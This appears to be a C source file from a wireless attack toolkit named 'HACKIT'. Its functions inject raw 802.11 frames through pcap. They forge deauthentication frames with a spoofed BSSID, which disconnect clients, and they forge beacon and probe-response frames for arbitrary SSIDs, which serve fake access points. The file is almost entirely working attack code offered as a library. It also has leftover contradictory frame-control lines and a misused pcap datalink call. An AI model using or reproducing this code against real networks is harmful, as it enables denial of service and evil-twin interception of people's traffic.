#include "packet_injector.h"
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#ifdef _WIN32
#include <windows.h>
#else
#include <unistd.h>
#endif

/* Minimal radiotap header prepended before injected frames */
static void build_radiotap_header(uint8_t* out, int* out_len) {
    memset(out, 0, HACKIT_80211_radiotap_LEN);
    out[0] = 0x00;                         /* version */
    out[1] = 0x00;                         /* padding */
    out[2] = (uint8_t)(HACKIT_80211_radiotap_LEN & 0xFF);
    out[3] = (uint8_t)((HACKIT_80211_radiotap_LEN >> 8) & 0xFF);
    /* present flags & rate fields left zeroed – monitor-mode injection */
    *out_len = HACKIT_80211_radiotap_LEN;
}

/* ---- internal pcap helpers -------------------------------------------- */

#ifdef HACKIT_HAS_PCAP
#ifdef _WIN32
#include <pcap.h>
#else
#include <pcap/pcap.h>
#endif

static pcap_t* open_pcap_for_inject(const char* iface) {
    char errbuf[PCAP_ERRBUF_SIZE];
    memset(errbuf, 0, sizeof(errbuf));

    pcap_t* handle = pcap_open_live(iface, 65535, 1, 100, errbuf);

    if (!handle) {
        fprintf(stderr, "[INJECT] pcap_open_live failed on '%s': %s\n", iface, errbuf);
        return NULL;
    }

#ifdef _WIN32
    pcap_datalink(handle, DLT_IEEE802_11_RADIO);
#else
    pcap_set_datalink(handle, DLT_IEEE802_11_RADIO);
#endif

    return handle;
}
#endif /* HACKIT_HAS_PCAP */

/* ---- public API ------------------------------------------------------- */

bool hackit_inject_raw_frame(const char* iface, const uint8_t* frame, int len) {
    if (!iface || !frame || len <= 0 || len > HACKIT_MAX_FRAME_LEN)
        return false;

#ifdef HACKIT_HAS_PCAP
    pcap_t* handle = open_pcap_for_inject(iface);
    if (!handle) return false;

    int sent = pcap_inject(handle, frame, len);
    pcap_close(handle);

    if (sent != len) {
        fprintf(stderr, "[INJECT] pcap_inject returned %d (expected %d)\n", sent, len);
        return false;
    }
    return true;
#else
    fprintf(stderr, "[INJECT] pcap not available. Install libpcap/Npcap for frame injection.\n");
    return false;
#endif
}

bool hackit_inject_deauth(const char* iface, const uint8_t* bssid, const uint8_t* station, uint16_t reason) {
    if (!iface || !bssid || !station)
        return false;

    uint8_t radiotap[HACKIT_80211_radiotap_LEN];
    int rad_len = 0;
    build_radiotap_header(radiotap, &rad_len);

    /* 802.11 Management frame – Deauthentication (subtype 12, type 0) */
    uint8_t frame[HACKIT_80211_radiotap_LEN + HACKIT_80211_MGMT_HDR_LEN + 2];
    memset(frame, 0, sizeof(frame));

    /* Radiotap header */
    memcpy(frame, radiotap, rad_len);

    /* Frame Control: type=0 (mgmt), subtype=12 (deauth) */
    uint8_t* fc = &frame[rad_len];
    fc[0] = 0x00;  /* subtype 12 in upper nibble = 0xC0, but lower bits need mgmt type (00) */
    fc[1] = 0x00;

    /* Actually set FC properly: Type=00, Subtype=1100 (12) => 0xC0 0x00 */
    fc[0] = 0xC0;
    fc[1] = 0x00;

    /* Duration */
    fc[2] = 0x00;
    fc[3] = 0x00;

    /* Address 1 – Destination (station or broadcast) */
    memcpy(&frame[rad_len + 4], station, 6);
    /* Address 2 – Source (BSSID) */
    memcpy(&frame[rad_len + 10], bssid, 6);
    /* Address 3 – BSSID */
    memcpy(&frame[rad_len + 16], bssid, 6);

    /* Reason code (little-endian, 2 bytes) */
    frame[rad_len + 22] = (uint8_t)(reason & 0xFF);
    frame[rad_len + 23] = (uint8_t)((reason >> 8) & 0xFF);

    return hackit_inject_raw_frame(iface, frame, rad_len + HACKIT_80211_MGMT_HDR_LEN + 2);
}

bool hackit_inject_beacon(const char* iface, const char* ssid, const uint8_t* bssid, uint8_t channel) {
    if (!iface || !ssid || !bssid)
        return false;

    int ssid_len = (int)strlen(ssid);
    if (ssid_len > 32) ssid_len = 32;

    uint8_t radiotap[HACKIT_80211_radiotap_LEN];
    int rad_len = 0;
    build_radiotap_header(radiotap, &rad_len);

    /* Fixed fields (12 bytes) + SSID tag (2+len) + DS Param tag (3) = 29 extra */
    int frame_len = rad_len + HACKIT_80211_MGMT_HDR_LEN + 12 + 2 + ssid_len + 3;
    if (frame_len > HACKIT_MAX_FRAME_LEN) return false;

    uint8_t frame[HACKIT_MAX_FRAME_LEN];
    memset(frame, 0, frame_len);

    /* Radiotap */
    memcpy(frame, radiotap, rad_len);

    /* Frame Control: Management Beacon (type=0, subtype=8) => 0x80 0x00 */
    frame[rad_len]     = 0x80;
    frame[rad_len + 1] = 0x00;

    /* Duration */
    frame[rad_len + 2] = 0x00;
    frame[rad_len + 3] = 0x00;

    /* Address 1 – Broadcast */
    memset(&frame[rad_len + 4], 0xFF, 6);
    /* Address 2 – Source / BSSID */
    memcpy(&frame[rad_len + 10], bssid, 6);
    /* Address 3 – BSSID */
    memcpy(&frame[rad_len + 16], bssid, 6);

    /* Fixed beacon parameters (12 bytes) */
    int off = rad_len + 24;
    /* Timestamp (8 bytes) – leave zeroed */
    off += 8;
    /* Beacon interval (2 bytes) – 100 TU (~102.4 ms) */
    frame[off]     = 0x64; /* 100 */
    frame[off + 1] = 0x00;
    off += 2;
    /* Capability info (2 bytes) – ESS + Short Preamble */
    frame[off]     = 0x01;
    frame[off + 1] = 0x04;
    off += 2;

    /* SSID tag (ID=0) */
    frame[off]     = 0x00;
    frame[off + 1] = (uint8_t)ssid_len;
    memcpy(&frame[off + 2], ssid, ssid_len);
    off += 2 + ssid_len;

    /* DS Parameter Set tag (ID=3, len=1) – channel */
    frame[off]     = 0x03;
    frame[off + 1] = 0x01;
    frame[off + 2] = channel;

    return hackit_inject_raw_frame(iface, frame, frame_len);
}

bool hackit_inject_proberesp(const char* iface, const char* ssid, const uint8_t* bssid, uint8_t channel) {
    if (!iface || !ssid || !bssid)
        return false;

    int ssid_len = (int)strlen(ssid);
    if (ssid_len > 32) ssid_len = 32;

    uint8_t radiotap[HACKIT_80211_radiotap_LEN];
    int rad_len = 0;
    build_radiotap_header(radiotap, &rad_len);

    /* Fixed fields (12) + SSID (2+len) + DS param (3) = extra */
    int frame_len = rad_len + HACKIT_80211_MGMT_HDR_LEN + 12 + 2 + ssid_len + 3;
    if (frame_len > HACKIT_MAX_FRAME_LEN) return false;

    uint8_t frame[HACKIT_MAX_FRAME_LEN];
    memset(frame, 0, frame_len);

    memcpy(frame, radiotap, rad_len);

    /* Frame Control: Probe Response (type=0, subtype=5) => 0x50 0x00 */
    frame[rad_len]     = 0x50;
    frame[rad_len + 1] = 0x00;

    /* Duration */
    frame[rad_len + 2] = 0x00;
    frame[rad_len + 3] = 0x00;

    /* Address 1 – destination (requesting station – use broadcast placeholder) */
    memset(&frame[rad_len + 4], 0xFF, 6);
    /* Address 2 – source (BSSID) */
    memcpy(&frame[rad_len + 10], bssid, 6);
    /* Address 3 – BSSID */
    memcpy(&frame[rad_len + 16], bssid, 6);

    /* Fixed probe response fields (12 bytes) */
    int off = rad_len + 24;
    /* Timestamp (8 bytes) */
    off += 8;
    /* Beacon interval (2 bytes) – 100 TU */
    frame[off]     = 0x64;
    frame[off + 1] = 0x00;
    off += 2;
    /* Capability info (2 bytes) */
    frame[off]     = 0x01;
    frame[off + 1] = 0x04;
    off += 2;

    /* SSID tag */
    frame[off]     = 0x00;
    frame[off + 1] = (uint8_t)ssid_len;
    memcpy(&frame[off + 2], ssid, ssid_len);
    off += 2 + ssid_len;

    /* DS Parameter Set tag */
    frame[off]     = 0x03;
    frame[off + 1] = 0x01;
    frame[off + 2] = channel;

    return hackit_inject_raw_frame(iface, frame, frame_len);
}
